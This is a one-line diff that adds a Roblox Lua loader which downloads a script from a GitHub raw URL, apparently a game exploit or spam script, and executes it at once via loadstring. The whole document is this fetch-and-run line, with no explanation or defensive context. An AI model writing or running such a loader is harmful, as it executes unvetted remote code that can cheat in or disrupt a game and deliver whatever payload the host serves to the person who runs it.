@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/it-wants-in-horror-spam5-d69l1qb5iborjx.lua"))()
